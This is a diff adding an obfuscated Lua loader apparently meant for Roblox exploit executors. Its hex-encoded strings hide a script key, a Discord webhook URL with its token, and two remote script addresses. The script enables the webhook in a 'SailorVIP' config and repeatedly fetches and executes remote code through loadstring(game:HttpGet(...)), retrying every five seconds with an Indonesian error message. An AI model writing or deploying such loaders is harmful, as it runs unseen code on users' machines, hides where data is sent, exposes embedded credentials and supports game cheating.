@@ -1,0 +1,31 @@
+local qQnWj = function(RybxO) local qeHhX='' for qXrSp=1,RybxO:len(),2 do qeHhX=qeHhX..string.char(tonumber(RybxO:sub(qXrSp,qXrSp+1),16)) end; return qeHhX end
+local amTl={'686e516d565576584176487979676a75646d767575576742624e4d6d56534c70','68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313437383538373332333132303631353530342f373055626c76624c416f4f4d466d6d32326148504c6e5150444d6344477632414e6e4d3536427733733568714f46593279693955685f4c446c6948362d6766646f72716a','68747470733a2f2f6170692e6c7561726d6f722e6e65742f66696c65732f76342f6c6f61646572732f61383235356437353931343462623631323763356237323232316363653563642e6c7561','68747470733a2f2f736967616e74656e672e73746f72652f6170692f7363726970742f752f66745f7a4e5744505931387774496675394779653353585a5a58687a526f387745724855756943366759722d4f59','53637269707420536967616e74656e6720676167616c2064696d7561742c206d656e636f6261206c6167692064616c616d203520646574696b2e2e2e204572726f723a20'}
+local vWZt, JHmw, iYZB = 0, 0, 0 
+
+task.spawn(function()
+    script_key = qQnWj(amTl[1])
+    getgenv().SailorVIP = {
+        Optimization = {
+            Enable = false,
+            FPSCap = 10,
+        },
+        Webhook = {
+            Enable = true,
+            URL = qQnWj(amTl[2]),
+        },
+    }
+    loadstring(game:HttpGet(qQnWj(amTl[3])))()
+end)
+
+task.spawn(function()
+    while true do
+        local success, err = pcall(function()
+            loadstring(game:HttpGet(qQnWj(amTl[4])))()
+        end)
+        if success then
+            break
+        end
+        warn(qQnWj(amTl[5]) .. tostring(err))
+        task.wait(5)
+    end
+end)
